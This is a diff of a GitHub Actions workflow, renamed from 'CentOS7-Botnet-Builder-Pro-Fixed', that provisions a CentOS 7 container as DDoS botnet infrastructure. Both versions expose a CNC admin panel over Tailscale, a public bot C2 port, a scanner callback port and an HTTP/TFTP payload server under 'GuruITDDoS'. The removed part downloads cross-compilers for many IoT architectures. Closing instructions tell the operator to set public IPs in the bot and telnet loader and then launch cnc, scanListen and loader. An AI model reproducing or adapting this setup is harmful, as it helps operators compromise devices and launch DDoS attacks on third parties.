@@ -1,32 +1,22 @@
-name: 🚀 CentOS7-Botnet-Builder-Pro-Fixed
+name: CentOS7-Minimal-Builder
 
 on:
   workflow_dispatch:
 
 jobs:
-  setup-and-run:
+  centos7:
     runs-on: ubuntu-latest
     timeout-minutes: 360
 
     steps:
-      - name: 📦 1. Checkout Repository
+      - name: Checkout Repository
         uses: actions/checkout@v4
 
-      - name: 🔧 2. Install Basic Dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y \
-            wget curl git \
-            xfce4 xfce4-goodies xrdp \
-            docker.io docker-compose \
-            net-tools iptables nftables \
-            python3 python3-pip
-
-      - name: 🐳 3. Start CentOS 7 Container with FIXED Repos
+      - name: Start CentOS 7 Container
         run: |
           docker pull centos:7
           docker run -d \
-            --name centos_c2 \
+            --name centos7 \
             --privileged \
             -p 1302:1302 \
             -p 80:80 \
@@ -34,14 +24,15 @@ jobs:
             -p 9473:9473 \
             -p 69:69/udp \
             -v ${{ github.workspace }}:/workspace \
-            -v /etc/localtime:/etc/localtime:ro \
             --restart unless-stopped \
             centos:7 /sbin/init
-          sleep 15
-          docker exec centos_c2 bash -c '
-            cp -f /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak 2>/dev/null || true
+          sleep 10
 
-            # Create CentOS-Vault.repo without heredoc (avoids YAML << issue)
+      - name: Fix CentOS 7 Repositories
+        run: |
+          docker exec centos7 bash -c '
+            # Backup and replace with vault repos
+            cp -f /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak 2>/dev/null || true
             echo "[base]" > /etc/yum.repos.d/CentOS-Vault.repo
             echo "name=CentOS-7 - Base" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "baseurl=http://vault.centos.org/7.9.2009/os/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
@@ -49,7 +40,6 @@ jobs:
             echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
-
             echo "[updates]" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "name=CentOS-7 - Updates" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "baseurl=http://vault.centos.org/7.9.2009/updates/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
@@ -57,7 +47,6 @@ jobs:
             echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
-
             echo "[extras]" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "name=CentOS-7 - Extras" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "baseurl=http://vault.centos.org/7.9.2009/extras/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
@@ -65,273 +54,106 @@ jobs:
             echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
-
             echo "[epel]" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "name=Extra Packages for Enterprise Linux 7 - \$basearch" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "baseurl=http://download.fedoraproject.org/pub/epel/7/\$basearch" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
             echo "gpgcheck=0" >> /etc/yum.repos.d/CentOS-Vault.repo
-
-            # Create epel.repo
-            echo "[epel]" > /etc/yum.repos.d/epel.repo
-            echo "name=Extra Packages for Enterprise Linux 7 - \$basearch" >> /etc/yum.repos.d/epel.repo
-            echo "baseurl=http://dl.fedoraproject.org/pub/epel/7/\$basearch" >> /etc/yum.repos.d/epel.repo
-            echo "enabled=1" >> /etc/yum.repos.d/epel.repo
-            echo "gpgcheck=0" >> /etc/yum.repos.d/epel.repo
-
             yum clean all
             rm -rf /var/cache/yum/*
           '
-          echo "✅ CentOS 7 container started with fixed repositories"
 
-      - name: 🛠️ 4. Install Essential Build Tools
+      - name: Install Essential Tools
         run: |
-          docker exec centos_c2 bash -c '
+          docker exec centos7 bash -c '
+            yum install -y epel-release
             yum update -y
             yum install -y \
-              epel-release \
               gcc gcc-c++ make \
               wget curl git \
-              screen nano vim \
+              screen nano \
               tar bzip2 gzip \
-              python3 python3-pip \
-              glibc-static glibc-devel \
-              libgcc libstdc++-static \
+              python3 \
+              glibc-static \
               gmp-devel \
-              httpd nginx \
-              vsftpd \
+              httpd \
               xinetd tftp tftp-server \
-              openssl openssl-devel \
-              net-tools \
               iptables-services \
               firewalld \
-              perl perl-Data-Dumper \
-              kernel-devel \
-              systemd-devel \
               --skip-broken
-            mkdir -p /etc/xcompile
-            echo "✅ Build tools installed"
           '
 
-      - name: 🔨 5. Download and Extract ALL Cross-Compilers
-        run: |
-          docker exec centos_c2 bash -c '
-            cd /etc/xcompile
-            echo "📥 Downloading cross-compilers from verified mirrors..."
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
-            wget --no-check-certificate http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
-            wget --no-check-certificate https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
-            wget --no-check-certificate https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2
-            wget --no-check-certificate https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
-            wget --no-check-certificate https://landley.net/aboriginal/downloads/binaries/cross-compiler-i486.tar.gz
-            echo "✅ Downloads complete. Extracting..."
-            tar -jxf cross-compiler-i586.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-i686.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-m68k.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-mips.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-mipsel.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-powerpc.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-sh4.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-sparc.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-armv4l.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-armv5l.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-armv6l.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-armv7l.tar.bz2 2>/dev/null || true
-            tar -xzf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz 2>/dev/null || true
-            tar -jxf cross-compiler-powerpc-440fp.tar.bz2 2>/dev/null || true
-            tar -jxf cross-compiler-x86_64.tar.bz2 2>/dev/null || true
-            tar -xzf cross-compiler-i486.tar.gz 2>/dev/null || true
-            echo "✅ Extraction complete. Organizing..."
-            rm -rf *.tar.bz2 *.tar.gz *.tar 2>/dev/null || true
-            [ -d cross-compiler-i486 ] && mv cross-compiler-i486 i486 2>/dev/null || true
-            [ -d cross-compiler-i586 ] && mv cross-compiler-i586 i586 2>/dev/null || true
-            [ -d cross-compiler-i686 ] && mv cross-compiler-i686 i686 2>/dev/null || true
-            [ -d cross-compiler-m68k ] && mv cross-compiler-m68k m68k 2>/dev/null || true
-            [ -d cross-compiler-mips ] && mv cross-compiler-mips mips 2>/dev/null || true
-            [ -d cross-compiler-mipsel ] && mv cross-compiler-mipsel mipsel 2>/dev/null || true
-            [ -d cross-compiler-powerpc ] && mv cross-compiler-powerpc powerpc 2>/dev/null || true
-            [ -d cross-compiler-sh4 ] && mv cross-compiler-sh4 sh4 2>/dev/null || true
-            [ -d cross-compiler-sparc ] && mv cross-compiler-sparc sparc 2>/dev/null || true
-            [ -d cross-compiler-armv4l ] && mv cross-compiler-armv4l armv4l 2>/dev/null || true
-            [ -d cross-compiler-armv5l ] && mv cross-compiler-armv5l armv5l 2>/dev/null || true
-            [ -d cross-compiler-armv6l ] && mv cross-compiler-armv6l armv6l 2>/dev/null || true
-            [ -d cross-compiler-armv7l ] && mv cross-compiler-armv7l armv7l 2>/dev/null || true
-            [ -d cross-compiler-powerpc-440fp ] && mv cross-compiler-powerpc-440fp powerpc-440fp 2>/dev/null || true
-            [ -d cross-compiler-x86_64 ] && mv cross-compiler-x86_64 x86_64 2>/dev/null || true
-            [ -d arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install ] && mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc 2>/dev/null || true
-            echo "✅ Cross-compilers ready in /etc/xcompile/"
-            ls -la /etc/xcompile/
-          '
-
-      - name: 🦊 6. Install & Configure Tailscale in Container
+      - name: Install Tailscale
         env:
           TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
         run: |
-          docker exec centos_c2 bash -c '
+          docker exec centos7 bash -c '
             curl -fsSL https://tailscale.com/install.sh | sh
             systemctl enable tailscaled
             systemctl start tailscaled || tailscaled 2>/dev/null &
             sleep 5
             tailscale up --authkey=$TAILSCALE_AUTH_KEY --hostname=centos7-builder --ssh
             sleep 5
-            TS_IP=$(tailscale ip -4 2>/dev/null || echo "Not connected")
+            TS_IP=$(tailscale ip -4 2>/dev/null)
             echo "TAILSCALE_IP=$TS_IP" >> /etc/environment
-            echo "✅ Tailscale connected: $TS_IP"
+            echo "✅ Tailscale IP: $TS_IP"
           '
 
-      - name: 🔥 7. Configure FIREWALL for Tailscale & Public Access
+      - name: Configure Firewall
         run: |
-          docker exec centos_c2 bash -c '
+          docker exec centos7 bash -c '
             systemctl start firewalld 2>/dev/null || service firewalld start 2>/dev/null || true
             firewall-cmd --permanent --direct --add-rule ipv4 filter INPUT 0 \
               -i tailscale0 -p tcp --dport 1302 -j ACCEPT 2>/dev/null || true
-            firewall-cmd --permanent --add-port=80/tcp 2>/dev/null || true
-            firewall-cmd --permanent --add-port=443/tcp 2>/dev/null || true
-            firewall-cmd --permanent --add-port=1302/tcp 2>/dev/null || true
-            firewall-cmd --permanent --add-port=9473/tcp 2>/dev/null || true
+            firewall-cmd --permanent --add-port={80,443,1302,9473}/tcp 2>/dev/null || true
             firewall-cmd --permanent --add-port=69/udp 2>/dev/null || true
             firewall-cmd --reload 2>/dev/null || true
             iptables -I INPUT -i tailscale0 -p tcp --dport 1302 -j ACCEPT 2>/dev/null || true
-            iptables -I INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null || true
-            iptables -I INPUT -p tcp --dport 1302 -j ACCEPT 2>/dev/null || true
-            iptables -I INPUT -p tcp --dport 9473 -j ACCEPT 2>/dev/null || true
-            iptables -I INPUT -p udp --dport 69 -j ACCEPT 2>/dev/null || true
-            service iptables save 2>/dev/null || true
-            echo "✅ Firewall configured for Tailscale and Public access"
-            echo ""
-            echo "=== FIREWALL RULES ==="
-            firewall-cmd --list-all 2>/dev/null || echo "firewalld not available"
-            echo ""
-            iptables -L INPUT -v | head -20
-            echo "======================"
+            echo "✅ Firewall configured"
           '
 
-      - name: 📁 8. Copy Your Source Files to Container
+      - name: Copy Source Files (if present)
         run: |
-          docker exec centos_c2 mkdir -p /root/cnc
-          docker exec centos_c2 mkdir -p /root/bot
-          docker exec centos_c2 mkdir -p /root/loader
-          docker exec centos_c2 mkdir -p /var/www/html/GuruITDDoS
-          docker exec centos_c2 mkdir -p /var/lib/tftpboot
-          docker exec centos_c2 mkdir -p /var/ftp
-          if [ -d "./cnc" ]; then
-            docker cp ./cnc/. centos_c2:/root/cnc/
-          fi
-          if [ -d "./bot" ]; then
-            docker cp ./bot/. centos_c2:/root/bot/
-          fi
-          if [ -d "./loader" ]; then
-            docker cp ./loader/. centos_c2:/root/loader/
-          fi
-          echo "✅ Source files copied (if present)"
+          docker exec centos7 mkdir -p /root/cnc /root/bot /root/loader
+          docker exec centos7 mkdir -p /var/www/html/GuruITDDoS
+          [ -d "./cnc" ] && docker cp ./cnc/. centos7:/root/cnc/
+          [ -d "./bot" ] && docker cp ./bot/. centos7:/root/bot/
+          [ -d "./loader" ] && docker cp ./loader/. centos7:/root/loader/
 
-      - name: 🚀 9. Setup HTTP/TFTP/FTP Services
+      - name: Display Connection Info
         run: |
-          docker exec centos_c2 bash -c '
-            systemctl enable httpd
-            systemctl start httpd
-            echo "RpcSecurity Download Server" > /var/www/html/index.html
-            echo "GuruITDDoS" > /var/www/html/GuruITDDoS/index.html
-            systemctl enable xinetd
-            systemctl enable tftp
-            # Use echo to create TFTP config (avoid heredoc)
-            echo "service tftp" > /etc/xinetd.d/tftp
-            echo "{" >> /etc/xinetd.d/tftp
-            echo "    socket_type     = dgram" >> /etc/xinetd.d/tftp
-            echo "    protocol        = udp" >> /etc/xinetd.d/tftp
-            echo "    wait            = yes" >> /etc/xinetd.d/tftp
-            echo "    user            = root" >> /etc/xinetd.d/tftp
-            echo "    server          = /usr/sbin/in.tftpd" >> /etc/xinetd.d/tftp
-            echo "    server_args     = -s -c /var/lib/tftpboot" >> /etc/xinetd.d/tftp
-            echo "    disable         = no" >> /etc/xinetd.d/tftp
-            echo "    per_source      = 11" >> /etc/xinetd.d/tftp
-            echo "    cps             = 100 2" >> /etc/xinetd.d/tftp
-            echo "    flags           = IPv4" >> /etc/xinetd.d/tftp
-            echo "}" >> /etc/xinetd.d/tftp
-            systemctl restart xinetd
-            systemctl enable vsftpd
-            systemctl start vsftpd
-            echo "✅ HTTP/TFTP/FTP services started"
-          '
-
-      - name: 🔧 10. Install Go and Dependencies
-        run: |
-          docker exec centos_c2 bash -c '
-            wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
-            rm -rf /usr/local/go
-            tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
-            echo "export PATH=\$PATH:/usr/local/go/bin" >> /etc/profile
-            echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.bashrc
-            export PATH=\$PATH:/usr/local/go/bin
-            go env -w GO111MODULE=off
-            go env -w GOPROXY=https://proxy.golang.org,direct
-            go get -u github.com/go-sql-driver/mysql
-            go get -u github.com/mattn/go-shellwords
-            echo "✅ Go installed"
-            go version
-          '
-
-      - name: 🎯 11. DISPLAY FINAL INSTRUCTIONS
-        run: |
-          TS_IP=$(docker exec centos_c2 tailscale ip -4 2>/dev/null || echo "Not connected - run tailscale up manually")
-          CONTAINER_IP=$(docker exec centos_c2 hostname -I | awk '{print $1}')
-          PUBLIC_IP=$(curl -s ifconfig.me || echo "Run: curl ifconfig.me")
+          TS_IP=$(docker exec centos7 tailscale ip -4 2>/dev/null || echo "Not connected")
+          PUBLIC_IP=$(curl -s ifconfig.me)
           echo ""
-          echo "╔════════════════════════════════════════════════════════════════╗"
-          echo "║         ✅ CENTOS 7 BOTNET BUILDER - READY!                  ║"
-          echo "╠════════════════════════════════════════════════════════════════╣"
-          echo "║                                                              ║"
-          echo "║  🔵 TAILSCALE NETWORK (YOUR ADMIN ACCESS)                   ║"
-          echo "║  ──────────────────────────────────────────────────         ║"
-          echo "║   CNC Admin Panel:  $TS_IP:1302                             ║"
-          echo "║   SSH Access:       ssh root@$TS_IP                         ║"
-          echo "║                                                              ║"
-          echo "║  🌐 PUBLIC INTERNET (BOT ACCESS)                            ║"
-          echo "║  ──────────────────────────────────────────────────         ║"
-          echo "║   Your Public IP:   $PUBLIC_IP                              ║"
-          echo "║   HTTP Download:    http://$PUBLIC_IP/GuruITDDoS/           ║"
-          echo "║   Bot C2 Port:      $PUBLIC_IP:1302                         ║"
-          echo "║   Scanner Callback: $PUBLIC_IP:9473                         ║"
-          echo "║                                                              ║"
-          echo "║  ⚠️  IMPORTANT - YOU MUST EDIT THESE FILES:                 ║"
-          echo "║  ──────────────────────────────────────────────────         ║"
-          echo "║   1. /root/bot/main.c - Change HTTP_SERVER to PUBLIC IP     ║"
-          echo "║   2. /root/bot/main.c - Change INET_ADDR to PUBLIC IP       ║"
-          echo "║   3. /root/loader/telnet.c - Change INET_ADDR to PUBLIC IP  ║"
-          echo "║   4. /root/cnc/main.go - KEEP Tailscale IP!                ║"
-          echo "║                                                              ║"
-          echo "║  🚀 TO START EVERYTHING:                                    ║"
-          echo "║  ──────────────────────────────────────────────────         ║"
-          echo "║   docker exec -it centos_c2 bash                            ║"
-          echo "║   cd /root/cnc && ./cnc &                                   ║"
-          echo "║   cd /root/loader && ./scanListen &                         ║"
-          echo "║   cd /root/loader && ./loader &                             ║"
-          echo "║   systemctl start httpd                                     ║"
-          echo "║                                                              ║"
-          echo "╚════════════════════════════════════════════════════════════════╝"
+          echo "========================================="
+          echo "✅ CentOS 7 Container is READY!"
+          echo "========================================="
+          echo "🔵 TAILSCALE IP: $TS_IP"
+          echo "   - CNC Admin Panel: $TS_IP:1302"
+          echo "   - SSH: docker exec -it centos7 bash"
           echo ""
-
-      - name: ⏳ 12. Keep Container Running (24 Hours)
-        run: |
-          echo "✅ CentOS 7 builder is running!"
-          echo "ℹ️  This workflow will stay alive for 24 hours"
-          echo "ℹ️  To SSH: docker exec -it centos_c2 bash"
+          echo "🌐 PUBLIC IP: $PUBLIC_IP"
+          echo "   - HTTP Download: http://$PUBLIC_IP/GuruITDDoS/"
+          echo "   - Bot C2: $PUBLIC_IP:1302"
+          echo "   - Scanner Callback: $PUBLIC_IP:9473"
           echo ""
-          sleep 86400
+          echo "📁 Your source files: /root/cnc, /root/bot, /root/loader"
+          echo "   (if you placed them in your repo)"
+          echo ""
+          echo "⚙️  Next steps:"
+          echo "   1. docker exec -it centos7 bash"
+          echo "   2. Edit IPs in /root/bot/main.c and /root/loader/telnet.c"
+          echo "   3. cd /root && chmod +x build.sh && ./build.sh"
+          echo "   4. Start services (./cnc, ./scanListen, ./loader, systemctl start httpd)"
+          echo ""
+          echo "⏳ Container will stay alive for 24 hours."
+          echo "========================================="
 
-      - name: 🧹 13. Cleanup (on workflow stop)
+      - name: Keep Container Alive (24h)
+        run: sleep 86400
+
+      - name: Cleanup
         if: always()
         run: |
-          docker stop centos_c2 || true
-          docker rm centos_c2 || true
-          echo "✅ Container cleaned up"
+          docker stop centos7 || true
+          docker rm centos7 || true
